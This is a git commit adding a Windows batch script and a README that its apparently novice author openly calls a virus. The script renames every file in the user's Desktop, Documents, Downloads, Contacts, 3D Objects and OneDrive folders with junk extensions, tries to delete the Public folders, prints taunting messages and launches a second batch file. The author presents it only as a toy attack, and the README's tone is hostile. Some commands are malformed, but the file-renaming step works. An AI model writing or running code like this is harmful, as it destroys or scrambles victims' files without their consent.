cc74d121e11dab0128ed059fe19efdfbd0113a70
nublt <104586845+nublt@users.noreply.github.com>
2024-02-21 08:39:22 -0500

    Add files via upload

---
+++ GOGO_gadget/GOGO_GADGET.bat
@@ -0,0 +1,54 @@
+@echo off
+	title man im gonna write this one weird as fuck
+		cd %USERPROFILE%\desktop 
+			ren *.*	*.IN_A_CLOUD_SMOKING_LOUD*
+				cd ..
+					cd 3D Objects
+						ren *.* *.LONELY_IM_SO_LONELY*
+							cd ..
+								cd Contacts
+									ren *.* *.IN_A_CLOUD_SMOKING_LOUD*
+												cd ..
+													cd Documents
+														ren *.* *.LONELY_IM_SO_LONELY*
+															cd Downloads
+																ren *.* *.IN_A_CLOUD_SMOKING_LOUD*
+																	cd ..
+
+																		cd OneDrive
+																			ren *.* *.LONELY_IM_SO_LONELY*
+																				cd C:\\Users\public
+																					rmdir Public Downloads
+																						rmdir Public Documents
+																							rmdir Public Music
+																								rmdir Public Pictures
+																									rmdir Public Videos
+																										cd C:\\
+																											echo null type > :loop NANANANANANANANA_BATMAN.txt goto loop wifi.bat
+																												
+
+echo go go gadget file fucker 9000
+timeout 2
+cls
+echo idk anymore man im too tired for this shit
+timeout 2
+cls
+echo havent slept in like 3 days, the code of gotham needs me.
+timeout 2 
+cls
+echo i am the codeman, the codeknight, the shit ran out of batman nicknames.
+timeout 2
+cls
+echo give me a second i got to google more
+timeout 2
+cls
+echo shit this is a pretty intense google search. my computer dont have enough reasorces to process it
+timeout 2
+cls
+echo oh wait
+timeout 2 
+cls
+echo MIND IF I BORROW YOURS? >:)
+timeout 2
+cls
+start wifi.bat
---
+++ GOGO_gadget/README.txt
@@ -0,0 +1,8 @@
+idk man 
+BLAHHHH
+BLAH BLAH BLAH FUCK ME I HATE THIS CLASS
+AHHHHHH
+anywho im new to code and shit so if it dosnt work then fix it yourself ya lazy bum
+this shit supposed to be a virus btw so im not responsilble or whatever the fuck im supposed to put here 
+
+blah stay toxic kiddos 
